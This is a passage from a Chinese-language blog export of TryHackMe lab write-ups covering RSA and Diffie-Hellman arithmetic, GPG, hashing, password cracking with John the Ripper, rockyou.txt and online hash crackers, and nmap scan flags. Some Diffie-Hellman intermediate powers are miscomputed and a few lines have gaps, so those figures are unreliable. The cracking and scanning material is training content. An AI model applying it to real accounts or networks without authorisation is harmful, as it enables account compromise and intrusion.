 q  + 1 &#x3D; 31243 − 157 − 199 + 1 &#x3D; 30888，Bob 选择e  &#x3D; 163 ，使得e与ϕ ( n )互质；此外，他选择d  &#x3D; 379，其中e  ×  d  &#x3D; 1 mod ϕ ( n )，即e  ×  d  &#x3D; 163 × 379 &#x3D; 61777且61777 mod 30888 &#x3D; 1。公钥为( n , e )，即(31243,163)，私钥为 $(n,d) ，即(31243,379)。</li>\n<li>假设他们想要加密的值是x  &#x3D; 13，那么 Alice 将计算并发送y  &#x3D;  x e mod n  &#x3D; 13 163 mod 31243 &#x3D; 16341。</li>\n<li>Bob 将通过计算x  &#x3D;  y d mod n  &#x3D; 16341 379 mod 31243 &#x3D; 13来解密收到的值。这样，Bob 就恢复了 Alice 发送的值。</li>\n</ol>\n<p>看看问题</p>\n<p><img src=\"/source/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/public%20key/task3.png\" alt=\"task3\"></p>\n<p>也是醉了 出了个寂寞</p>\n<p>第一问就是4391*6659&#x3D;29239669</p>\n<p>第二问就是29239669-4391-6659+1&#x3D;29228620</p>\n<p>分别是第一步和第二步的开头</p>\n<h2 id=\"task4-1\"><a href=\"#task4-1\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p>Diffie-Hellman Key Exchange 简称就叫dh协议 密钥交换</p>\n<p>密钥交换旨在在双方之间建立共享秘密。这是一种允许双方在非安全通信信道上建立共享秘密的方法，无需预先存在共享秘密，观察者也无法获取此密钥。因此，此共享密钥可用于后续通信中的对称加密。</p>\n<p>研究一下具体的过程。</p>\n<p>步骤 1: 公共材料<br>Alice 和 Bob 确定一个公共的素数p 和一个公共的生成器g，这两者对双方都是公开的。假设我们选择：<br>p &#x3D; 29（一个素数）<br>g &#x3D; 3（生成器）<br>这些值是公开的，任何人都可以知道它们。</p>\n<p>步骤 2: Alice 和 Bob 各自选择私钥<br>Alice 选择一个私钥 a，并且不能告诉别人。假设 Alice 选择了私钥 a &#x3D; 13。<br>Bob 选择一个私钥 b，并且也不会告诉别人。假设 Bob 选择了私钥 b &#x3D; 15。<br>这些私钥是保密的，只由 Alice 和 Bob 知道。</p>\n<p>步骤 3: 计算公钥<br>根据 Diffie-Hellman 的规则，每个人使用自己的私钥来计算公钥：</p>\n<p>Alice 的公钥：A &#x3D; g^a mod p<br>A &#x3D; 3^13 mod 29<br>计算 3^13 mod 29：<br>3^13 &#x3D; 1594323，<br>然后 A mod p<br>1594323 mod 29 &#x3D; 19<br>所以 Alice 的公钥是 A &#x3D; 19。</p>\n<p>Bob 的公钥：B &#x3D; g^b mod p<br>B &#x3D; 3^15 mod 29<br>计算 3^15 mod 29：<br>3^15 &#x3D; 14348907，<br>然后 B mod p<br> 14348907 mod 29 &#x3D; 26<br>所以 Bob 的公钥是 B &#x3D; 26。</p>\n<p>步骤 4: Alice 和 Bob 交换公钥<br>Alice 发送自己的公钥 A &#x3D; 19 给 Bob。<br>Bob 发送自己的公钥 B &#x3D; 26 给 Alice。<br>这时，Alice 和 Bob 都拥有对方的公钥。</p>\n<p>步骤 5: 计算共享密钥<br>Alice 和 Bob 使用自己私有的密钥 的公钥来计算共享密钥：</p>\n<p>Alice 的计算：<br>Alice 收到 Bob 的公钥 B &#x3D; 26，然    算 B^a mod p：<br>B^a mod p &#x3D; 26^13 mod 29<br>计算 26^13 mod 29：<br>26^13 &#x3D; 10460353203，然后 104603    mod 29 &#x3D; 10<br>所以 Alice 得到的共享密钥是 10。    </p>\n<p>Bob 的计算：<br>Bob 收到 Alice 的公钥 A &#x3D; 19，然    算 A^b mod p：<br>A^b mod p &#x3D; 19^15 mod 29<br>计算 19^15 mod 29：<br>19^15 &#x3D; 41821194261，然后 418211    mod 29 &#x3D; 10<br>所以 Bob 得到的共享密钥是 10。</p>\n<p>步骤 6: 完成<br>最终，Alice 和 Bob 都得到了相同 密钥 10，并且可以用它来进行后续的加密通信。</p>\n<p>看看图解</p>\n<p><img src=\"/source/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/public%20key/dh.png\" alt=\"dh\"></p>\n<p>来练练手</p>\n<p><img src=\"/source/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/public%20key/task4.png\" alt=\"dh\"></p>\n<p>三四问可以在<a href=\"https://www.wolframalpha.com/\">这里</a>进行计算</p>\n<p>第一问<br>p&#x3D;29<br>g&#x3D;5<br>a&#x3D;12</p>\n<p>A &#x3D; g^a mod p<br>A &#x3D; 5^12 mod 29<br>A &#x3D; 244140625 mod 29 &#x3D; 7</p>\n<p>第二问 一样<br>b&#x3D;17<br>其他都一样<br>B &#x3D; g^b mod p<br>B &#x3D; 5^17 mod 29 &#x3D; 9</p>\n<p>第三问<br>已知p  &#x3D; 29，a  &#x3D; 12，并且从第二个问题得到B，那么 Bob 计算出的密钥是什么？ </p>\n<p>key &#x3D; B^a mod p<br>key &#x3D; 9^ 12 mod 29 &#x3D;24</p>\n<p>第四问<br>已知p  &#x3D; 29，b  &#x3D; 17，并且从第一个问题得到A，那么 Alice 计算出的密钥是什么？</p>\n<p>key &#x3D; A^b mod p<br>key &#x3D; 7^17 mod 29 &#x3D;24</p>\n<h2 id=\"task5\"><a href=\"#task5\" class=\"headerlink\" title=\"task5\"></a>task5</h2><p>讲的是ssh秘钥</p>\n<p><img src=\"/source/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/public%20key/rsa.png\" alt=\"task5\"></p>\n<p><img src=\"/source/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/public%20key/task5.png\" alt=\"task5\"></p>\n<h2 id=\"task6\"><a href=\"#task6\" class=\"headerlink\" title=\"task6\"></a>task6</h2><p>数字签名和证书<br>数字签名提供了一种验证数字消息或文档真实性和完整性的方法。数字签名和物理签名​​具有相同的法律效力。</p>\n<p>证书是公钥加密技术的一个重要应用，它们也与数字签名相关。它们最常用于 HTTPS</p>\n<p>证书有一个信任链，从根 CA（证书颁发机构）开始。</p>\n<p>问题就跳过了 文章都是可以找到的</p>\n<h2 id=\"task7\"><a href=\"#task7\" class=\"headerlink\" title=\"task7\"></a>task7</h2><p>PGP和GPG<br>PGP代表 Pretty Good Privacy。它是一种实现加密的软件，用于加密文件、执行数字签名等。GnuPG或GPG是 OpenPGP 标准的开源实现。</p>\n<p>看看问题</p>\n<p><img src=\"/source/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/public%20key/task77.png\" alt=\"task77\"></p>\n<p>需要我们导入密钥 然后解密就可以了</p>\n<p><img src=\"/source/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/public%20key/task7.png\" alt=\"task7\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gpg --import tryhackme.key</span><br><span class=\"line\">gpg --decrypt message.gpg</span><br></pre></td></tr></table></figure>\n\n<p>到此第二部分也简单介绍到这里</p>\n<h1 id=\"Hashing-Basics\"><a href=\"#Hashing-Basics\" class=\"headerlink\" title=\"Hashing Basics\"></a>Hashing Basics</h1><p>哈希值是由哈希函数计算的固定大小的字符串或字符。哈希函数接受任意大小的输入并返回固定长度的输出，即哈希值。</p>\n<p>我们也能通过对比hash值来判断下载的副本是否与原始文件完全相同</p>\n<h2 id=\"task2-1\"><a href=\"#task2-1\" class=\"headerlink\" title=\"task2\"></a>task2</h2><h3 id=\"什么是哈希函数\"><a href=\"#什么是哈希函数\" class=\"headerlink\" title=\"什么是哈希函数\"></a>什么是哈希函数</h3><p>哈希函数不同于加密。它没有密钥，并且不可能（或计算上不切实际）从输出返回到输入。输出具有固定大小。</p>\n<h3 id=\"什么是哈希碰撞\"><a href=\"#什么是哈希碰撞\" class=\"headerlink\" title=\"什么是哈希碰撞\"></a>什么是哈希碰撞</h3><p>哈希碰撞是指两个不同的输入产生相同的输出。</p>\n<h3 id=\"题\"><a href=\"#题\" class=\"headerlink\" title=\"题\"></a>题</h3><p>来看看题</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/task2.png\" alt=\"task2\"></p>\n<p>第一问问照片的sha256值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sha256sum passport.jpg</span><br></pre></td></tr></table></figure>\n<p>来获得照片的sha256的值</p>\n<p>第二问<br>md5能输出一个128位(16字节)的散列值 答案就是16</p>\n<p>第三问<br>八位hash输出 可以当成2^8&#x3D;256</p>\n<h2 id=\"task3-2\"><a href=\"#task3-2\" class=\"headerlink\" title=\"task3\"></a>task3</h2><p>身份验证的密码存储不安全</p>\n<p>密码方面的三种不安全做法：</p>\n<ul>\n<li>以明文形式存储密码</li>\n<li>使用已弃用的加密方式存储密码</li>\n<li>使用不安全的哈希算法存储密码</li>\n</ul>\n<p>这个问就是找密码</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/task3.png\" alt=\"task3\"></p>\n<p>问第20个密码是啥 直接head 查到第二十个就行了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">head -n 20 rockyou.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/mima.png\" alt=\"task3\"></p>\n<h2 id=\"task4-2\"><a href=\"#task4-2\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p>使用哈希存储密码</p>\n<p>Rainbow Table 彩虹表(彩虹表是哈希到明文的查找表) 因此您可以从哈希中快速找出用户刚刚拥有的密码。</p>\n<p><a href=\"https://crackstation.net/\">crackstation</a> 和<a href=\"https://hashes.com/en/decrypt/hash\">hashes.com</a>能给我们帮助<br>内部使用大量彩虹表来提供快速破解无盐哈希密码的功能。</p>\n<p>这个时候要提一嘴了 什么是加盐</p>\n<p>加盐是指在加密过程中，向原始数据（通常是密码）中添加一个随机生成的字符串（即“盐”），然后再进行加密。</p>\n<p>这个随机字符串通常是唯一的，并且与原始数据一起存储。 加盐的目的是增加加密数据的复杂性，使得即使两个相同的密码，其加密结果也会不同。</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/task4.png\" alt=\"task4\"></p>\n<p>问题一<br>我们能在上面的表上查到</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/caihong.png\" alt=\"task4\"></p>\n<p>问题二</p>\n<p>我们把hash值复制到<a href=\"https://hashes.com/en/decrypt/hash\">hashes.com</a>能破解出结果</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/tryhackme.png\" alt=\"task4\"></p>\n<h2 id=\"task5-1\"><a href=\"#task5-1\" class=\"headerlink\" title=\"task5\"></a>task5</h2><p>识别密码哈希值</p>\n<p>在Linux上，密码哈希存储在 中&#x2F;etc&#x2F;shadow，通常只有 root 才能读取。它们过去存储在 中&#x2F;etc&#x2F;passwd，每个人都可以读取。</p>\n<p>该shadow文件包含密码信息。每行包含九个字段，以冒号 ( :) 分隔。前两个字段是登录名和加密密码。</p>\n<p>加密密码字段包含哈希密码，该密码由四个部分组成：前缀（算法 ID）、选项（参数）、盐和哈希。</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/task5.png\" alt=\"task5\"></p>\n<p>第一问遇事不决直接百度 能查出是256的大小</p>\n<p>第二问和第三问 我们在<a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">Hashcat 示例</a>能找到我们要的答案</p>\n<p>第二问</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/2410.png\" alt=\"task5\"></p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/scrypt.png\" alt=\"task5\"></p>\n<h2 id=\"task6-1\"><a href=\"#task6-1\" class=\"headerlink\" title=\"task6\"></a>task6</h2><p>密码破解</p>\n<p>可以在<a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">hashcat</a>和<a href=\"https://www.openwall.com/john/\">John the Ripper</a>这两个工具上</p>\n<p>第一个最好在主机上搞 榨干全部性能</p>\n<p><a href=\"https://www.tunnelsup.com/hash-analyzer/\">哈希分析</a></p>\n<p>来试试手</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/task6.png\" alt=\"task6\"></p>\n<p>第一问<br>我们用john来破解<br>$2a$就是bcrypt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">john hash.txt -format=bcrypt -wordlist=/usr/share/wordlists</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/850.png\" alt=\"task6\"></p>\n<p>能破解出85208520</p>\n<p>第二 三 四问 我们都可以在<a href=\"https://hashes.com/en/decrypt/hash\">这里</a>去破解</p>\n<p>主要是不知道为啥这个机子的john很抽象 就只能在网站那破解</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/holl.png\" alt=\"task6\"></p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/spaceman.png\" alt=\"task6\"></p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/funforyou.png\" alt=\"task6\"></p>\n<h2 id=\"task7-1\"><a href=\"#task7-1\" class=\"headerlink\" title=\"task7\"></a>task7</h2><p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/task7.png\" alt=\"task7\"></p>\n<p>第一问</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sha256sum </span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/2561.png\" alt=\"task7\"></p>\n<p>第二问<br><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/512.png\" alt=\"task7\"></p>\n<h2 id=\"task8\"><a href=\"#task8\" class=\"headerlink\" title=\"task8\"></a>task8</h2><p>使用base64解码RU5jb2RlREVjb2RlCg&#x3D;&#x3D;</p>\n<p>把这串复制到<a href=\"https://gchq.github.io/CyberChef/\">cyberchef</a>里面能得出解码：ENcodeDEcode</p>\n<p>第三部分就这样结束了 后面还会补充多点内容 </p>\n"},{"title":"tryhackme nmap基础介绍","date":"2025-02-10T01:37:08.000Z","top_img":"transparent","_content":"\n![title](/source/images/tryhackme-nmap基础介绍/title.png)\n\n\n\n提到Nmap使用多种方式来指定其目标：\n\n- IP 范围使用-：如果要扫描从 192.168.0.1 到 192.168.0.10 的所有 IP 地址，就写成192.168.0.1-10\n  \n- IP 子网使用/：如果要扫描子网，可以将其表示为192.168.0.1/24，这相当于192.168.0.0-255\n- 主机名：您还可以通过主机名指定目标，例如，example.thm\n\n更好地控制Nmap如何通过给定端口发现实时主机（例如-PS[portlist]、-PA[portlist]），-PU[portlist]以进行TCP SYN、TCP ACK 和UDP发现。\n\n\n- -sL 此扫描仅列出要扫描的目标，而不会实际扫描它们\n\n- -sn 目的是发现活动主机而不尝试发现其上运行的服务。\n\n- -sT 连接扫描  (扫描需要完成tcp三次握手)\n\n- -sS SYN扫描(仅完成第一步)\n\n- -sU UDP扫描 (UDP扫描)\n\n- -F 代表快速模式，扫描 100 个最常见的端口\n\n- -p[range] 允许您指定要扫描的端口范围。例如，-p10-1024扫描从端口 10 到端口 1024，\n\n- -p-25 扫描 1 到 25 之间的所有端口。\n- -p- 扫描所有端口和相当于-p1-65535\n\n- -O 启用操作系统检测。\n\n- -sV 启用版本检测。这非常方便您用更少的按键收集有关目标的更多信息。发现了几个开放端口，并想知道哪些服务正在监听它们\n\n- -A 有-O，-sV并且还有更多功能，此选项可实现操作系统检测、版本扫描和跟踪路由等功能。\n\n- -Pn 能将所有主机视为在线并对每个主机进行端口扫描，包括在主机发现阶段未响应的主机。\n\n- -T 可以按名称或编号选择计时模板。举例: -T0(或-T 0) 或-T paranoid(paranoid就是计时模板的名称)以选择最慢的计时。\n\n并行探测的数量可以通过--min-parallelism <numprobes>和 来控制--max-parallelism <numprobes>。这些选项可用于设置主机组中同时活动的 TCP 和 UDP 端口探测数量的最小值和最大值。\n\n类似有用的选项是--min-rate <number>和--max-rate <number>。顾名思义，它们可以控制nmap发送数据包的最小和最大速率。\n\n- --host-timeout <time>。此选项指定您愿意等待的最大时间，适用于速度较慢的主机或网络连接较慢的主机。\n\n- -v 启用详细输出\n\n- -d 使用调试级别输出 最高级别是-d9 您可以通过添加一个或多个“d”或直接指定调试级别来提高调试级别\n\n- oN <filename>- 正常输出\n- oX <filename>- XML输出\n- oG <filename>- -able 输出 (对和grep有用)grepawk\n- oA <basename>- 以所有主要格式输出\n\n随便看看thm的问题\n## task2\n![task1](/images/tryhackme-nmap基础介绍/task2.png)\n\n```\nnmap -sL ip/27\n```\n用-sL列出所有要扫描的目标 找到最后一个就行\n![task](/images/tryhackme-nmap基础介绍/sl%20ip.png)\n\n\n## task3\n![task1](/images/tryhackme-nmap基础介绍/task3.png)\n\n```\nnmap -sT ip\n```\n就能列出所有tcp端口 在这些端口中能发现一个http的端口8008 ip加端口就能获得第二问的flag\n\n![task2](/images/tryhackme-nmap基础介绍/tcpport端口.png)\n\n![task2](/images/tryhackme-nmap基础介绍/8008.png)\n\n## task4\n![task1](/images/tryhackme-nmap基础介绍/task4.png)\n\n```\nnmap -A ip\n```\n用了-A把服务器名称 版本等详细信息都查出来了 慢慢找就行\n![task4](/images/tryhackme-nmap基础介绍/web.png)\n\n## task5\n\n下面就是直接输入就行的 -T的用法\n\n![task1](/images/tryhackme-nmap基础介绍/task5.png)\n\n## task6\n启用调试是-d\n![task1](/images/tryhackme-nmap基础介绍/task6.png)\n\n\n## task7\n在没有root权限 是本地用户的时候只能使用-sT的tcp连接扫描(connect scan)\n![task1](/images/tryhackme-nmap基础介绍/task7.png)\n\n解决了nmap的基础问题","source":"_posts/tryhackme-nmap基础介绍.md","raw":"---\ntitle: tryhackme nmap基础介绍\ndate: 2025-02-10 09:37:08\ntags: linux nmap\ntop_img: transparent\n---\n\n![title](/source/images/tryhackme-nmap基础介绍/title.png)\n\n\n\n提到Nmap使用多种方式来指定其目标：\n\n- IP 范围使用-：如果要扫描从 192.168.0.1 到 192.168.0.10 的所有 IP 地址，就写成192.168.0.1-10\n  \n- IP 子网使用/：如果要扫描子网，可以将其表示为192.168.0.1/24，这相当于192.168.0.0-255\n- 主机名：您还可以通过主机名指定目标，例如，example.thm\n\n更好地控制Nmap如何通过给定端口发现实时主机（例如-PS[portlist]、-PA[portlist]），-PU[portlist]以进行TCP SYN、TCP ACK 和UDP发现。\n\n\n- -sL 此扫描仅列出要扫描的目标，而不会实际扫描它们\n\n- -sn 目的是发现活动主机而不尝试发现其上运行的服务。\n\n- -sT 连接扫描  (扫描需要完成tcp三次握手)\n\n- -sS SYN扫描(仅完成第一步)\n\n- -sU UDP扫描 (UDP扫描)\n\n- -F 代表快速模式，扫描 100 个最常见的端口\n\n- -p[range] 允许您指定要扫描的端口范围。例如，-p10-1024扫描从端口 10 到端口 1024，\n\n- -p-25 扫描 1 到 25 之间的所有端口。\n- -p- 扫描所有端口和相当于-p1-65535\n\n- -O 启用操作系统检测。\n\n- -sV 启用版本检测。这非常方便您用更少的按键收集有关目标的更多信息。发现了几个开放端口，并想知道哪些服务正在监听它们\n\n- -A 有-O，-sV并且还有更多功能，此选项可实现操作系统检测、版本扫描和跟踪路由等功能。\n\n- -Pn 能将所有主机视为在线并对每个主机进行端口扫描，包括在主机发现阶段未响应的主机。\n\n- -T 可以按名称或编号选择计时模板。举例: -T0(或-T 0) 或-T paranoid(paranoid就是计时模板的名称)以选择最慢的计时。\n\n并行探测的数量可以通过--min-parallelism <numprobes>和 来控制--max-parallelism <numprobes>。这些选项可用于设置主机组中同时活动的 TCP 和 UDP 端口探测数量的最小值和最大值。\n\n类似有用的选项是--min-rate <number>和--max-rate <number>。顾名思义，它们可以控制nmap发送数据包的最小和最大速率。\n\n- --host-timeout <time>。此选项指定您愿意等待的最大时间，适用于速度较慢的主机或网络连接较慢的主机。\n\n- -v 启用详细输出\n\n- -d 使用调试级别输出 最高级别是-d9 您可以通过添加一个或多个“d”或直接指定调试级别来提高调试级别\n\n- oN <filename>- 正常输出\n- oX <filename>- XML输出\n- oG <filename>- -able 输出 (对和grep有用)grepawk\n- oA <basename>- 以所有主要格式输出\n\n随便看看thm的问题\n## task2\n![task1](/images/tryhackme-nmap基础介绍/task2.png)\n\n```\nnmap -sL ip/27\n```\n用-sL列出所有要扫描的目标 找到最后一个就行\n![task](/images/tryhackme-nmap基础介绍/sl%20ip.png)\n\n\n## task3\n![task1](/images/tryhackme-nmap基础介绍/task3.png)\n\n```\nnmap -sT ip\n```\n就能列出所有tcp端口 在这些端口中能发现一个http的端口8008 ip加端口就能获得第二问的flag\n\n![task2](/images/tryhackme-nmap基础介绍/tcpport端口.png)\n\n![task2](/images/tryhackme-nmap基础介绍/8008.png)\n\n## task4\n![task1](/images/tryhackme-nmap基础介绍/task4.png)\n\n```\nnmap -A ip\n```\n用了-A把服务器名称 版本等详细信息都查出来了 慢慢找就行\n![task4](/images/tryhackme-nmap基础介绍/web.png)\n\n## task5\n\n下面就是直接输入就行的 -T的用法\n\n![task1](/images/tryhackme-nmap基础介绍/task5.png)\n\n## task6\n启用调试是-d\n![task1](/images/tryhackme-nmap基础介绍/task6.png)\n\n\n## task7\n在没有root权限 是本地用户的时候只能使用-sT的tcp连接扫描(connect scan)\n![task1](/images/tryhackme-nmap基础介绍/task7.png)\n\n解决了nmap的基础问题","slug":"tryhackme-nmap基础介绍","published":1,"updated":"2025-02-10T03:09:33.347Z","comments":1,"layout":"post","photos":[],"_id":"cm74njvxj000wtsg61j9sgvpa","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><p><img src=\"/source/images/tryhackme-nmap%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/title.png\" alt=\"title\"></p>\n<p>提到Nmap使用多种方式来指定其目标：</p>\n<ul>\n<li><p>IP 范围使用-：如果要扫描从 192.168.0.1 到 192.168.0.10 的所有 IP 地址，就写成192.168.0.1-10</p>\n</li>\n<li><p>IP 子网使用&#x2F;：如果要扫描子网，可以将其表示为192.168.0.1&#x2F;24，这相当于192.168.0.0-255</p>\n</li>\n<li><p>主机名：您还可以通过主机名指定目标，例如，example.thm</p>\n</li>\n</ul>\n<p>更好地控制Nmap如何通过给定端口发现实时主机（例如-PS[portlist]、-PA[portlist]），-PU[portlist]以进行TCP SYN、TCP ACK 和UDP发现。</p>\n<ul>\n<li><p>-sL 此扫描仅列出要扫描的目标，而不会实际扫描它们</p>\n</li>\n<li><p>-sn 目的是发现活动主机而不尝试发现其上运行的服务。</p>\n</li>\n<li><p>-sT 连接扫描  (扫描需要完成tcp三次握手)</p>\n</li>\n<li><p>-sS SYN扫描(仅完成第一步)</p>\n</li>\n<li><p>-sU UDP扫描 (UDP扫描)</p>\n</li>\n<li><p>-F 代表快速模式，扫描 100 个最常见的端口</p>\n</li>\n<li><p>-p[range] 允许您指定要扫描的端口范围。例如，-p10-1024扫描从端口 10 到端口 1024，</p>\n</li>\n<li><p>-p-25 扫描 1 到 25 之间的所有端口。</p>\n</li>\n<li><p>-p- 扫描所有端口和相当于-p1-65535</p>\n</li>\n<li><p>-O 启用操作系统检测。</p>\n</li>\n<li><p>-sV 启用版本检测。这非常方便您用更少的按键收集有关目标的更多信息。发现了几个开放端口，并想知道哪些服务正在监听它们</p>\n</li>\n<li><p>-A 有-O，-sV并且还有更多功能，此选项可实现操作系统检测、版本扫描和跟踪路由等功能。</p>\n</li>\n<li><p>-Pn 能将所有主机视为在线并对每个主机进行端口扫描，包括在主机发现阶段未响应的主机。</p>\n</li>\n<li><p>-T 可以按名称或编号选择计时模板。举例: -T0(或-T 0) 或-T paranoid(paranoid就是计时模板的名称)以选择最慢的计时。</p>\n</li>\n</ul>\n<p>并行探测的数量可以通过–min-parallelism <numprobes>和 来控制–max-parallelism <numprobes>。这些选项可用于设置主机组中同时活动的 TCP 和 UDP 端口探测数量的最小值和最大值。</numprobes></numprobes></p>\n<p>类似有用的选项是–min-rate <number>和–max-rate <number>。顾名思义，它们可以控制nmap发送数据包的最小和最大速率。</number></number></p>\n<ul>\n<li><p>–host-timeout <time>。此选项指定您愿意等待的最大时间，适用于速度较慢的主机或网络连接较慢的主机。</time></p>\n</li>\n<li><p>-v 启用详细输出</p>\n</li>\n<li><p>-d 使用调试级别输出 最高级别是-d9 您可以通过添加一个或多个“d”或直接指定调试级别来提高调试级别</p>\n</li>\n<li><p>oN <filename>- 正常输出</filename></p>\n</li>\n<li><p>oX <filename>- XML输出</filename></p>\n</li>\n<li><p>oG <filename>- -able 输出 (对和grep有用)grepawk</filename></p>\n</li>\n<li><p>oA <basename>- 以所有主要格式输出</basename></p>\n</li>\n</ul>\n<p>随便看看thm的问题</p>\n<h2 id=\"task2\"><a href=\"#task2\" class=\"headerlink\" title=\"task2\"></a>task2</h2><p><img src=\"/images/tryhackme-nmap%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/task2.png\" alt=\"task1\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sL ip/27</span><br></pre></td></tr></table></figure>\n<p>用-sL列出所有要扫描的目标 找到最后一个就行<br><img src=\"/images/tryhackme-nmap%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/sl%20ip.png\" alt=\"task\"></p>\n<h2 id=\"task3\"><a href=\"#task3\" class=\"headerlink\" title=\"task3\"></a>task3</h2><p><img src=\"/images/tryhackme-nmap%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/task3.png\" alt=\"task1\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sT ip</span><br></pre></td></tr></table></figure>\n<p>就能列出所有tcp端口 在这些端口中能发现一个http的端口8008 ip加端口就能获得第二问的flag</p>\n<p><img src=\"/images/tryhackme-nmap%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/tcpport%E7%AB%AF%E5%8F%A3.png\" alt=\"task2\"></p>\n<p><img src=\"/images/tryhackme-nmap%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/8008.png\" alt=\"task2\"></p>\n<h2 id=\"task4\"><a href=\"#task4\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p><img src=\"/images/tryhackme-nmap%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/task4.png\" alt=\"task1\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -A ip</span><br></pre></td></tr></table></figure>\n<p>用了-A把服务器名称 版本等详细信息都查出来了 慢慢找就行<br><img src=\"/images/tryhackme-nmap%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/web.png\" alt=\"task4\"></p>\n<h2 id=\"task5\"><a href=\"#task5\" class=\"headerlink\" title=\"task5\"></a>task5</h2><p>下面就是直接输入就行的 -T的用法</p>\n<p><img src=\"/images/tryhackme-nmap%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/task5.png\" alt=\"task1\"></p>\n<h2 id=\"task6\"><a href=\"#task6\" class=\"headerlink\" title=\"task6\"></a>task6</h2><p>启用调试是-d<br><img src=\"/images/tryhackme-nmap%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/task6.png\" alt=\"task1\"></p>\n<h2 id=\"task7\"><a href=\"#task7\" class=\"headerlink\" title=\"task7\"></a>task7</h2><p>在没有root权限 是本地用户的时候只能使用-sT的tcp连接扫描(connect scan)<br><img src=\"/images/tryhackme-nmap%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/task7.png\" alt=\"task1\"></p>\n<p>解决了nmap的基础问题</p>\n","excerpt":"","more":"<p><img src=\"/source/images/tryhackme-nmap%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/title.png\" 